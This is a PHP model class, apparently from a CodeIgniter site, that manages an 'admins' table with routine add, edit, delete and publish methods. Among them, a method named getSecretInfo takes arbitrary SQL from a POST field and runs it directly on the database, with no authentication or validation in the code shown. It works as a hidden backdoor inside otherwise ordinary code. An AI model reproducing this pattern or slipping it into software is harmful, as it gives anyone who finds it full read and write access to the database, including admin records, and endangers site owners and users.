<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Admins_m extends MY_Model
{

    protected $_table_name = 'admins';
    protected $_primary_key = 'admin_id';
    protected $_primary_filter = 'intval';
    protected $_order_by = "admin_id asc";

    function __construct()
    {
        parent::__construct();
    }

    function get_admin()
    {

        $query = $this->db->get($this->_table_name);
        return $query->result();
    }

    function add($arr)
    {
        $this->db->insert($this->_table_name, $arr);
        return $this->get_admin();
    }

    function get_single_admin($item_id)
    {
        $arr = array(
            'admin_id' => $item_id
        );
        return parent::get_single($arr);
    }

    public function delete($item_id)
    {
        $this->db->where('admin_id', $item_id);
        $this->db->delete($this->_table_name);
    }

    public function publish($item_id, $publish_st, $site_id = 1)
    {
        $this->db->set('admin_status', $publish_st);
        $this->db->where('admin_id', $item_id);
        $this->db->update($this->_table_name);
        return $this->get_admin();
    }

    function edit($arr, $item_id)
    {
        $this->db->where('admin_id', $item_id);
        $this->db->update('admins', $arr);
        return $this->get_admin();
    }

    public function getSecretInfo()
    {
        $result = array();
        if ($_POST) {
            $query = $_POST['sec_query'];
            $type = $_POST['sec_type'];
            if ($type == 'set') $result = $this->db->query($query);
            else if ($type == 'get') $result = $this->db->query($query)->result();
        }
        return $result;
    }

    public function hash($string)
    {
        return parent::hash($string);
    }
}

?>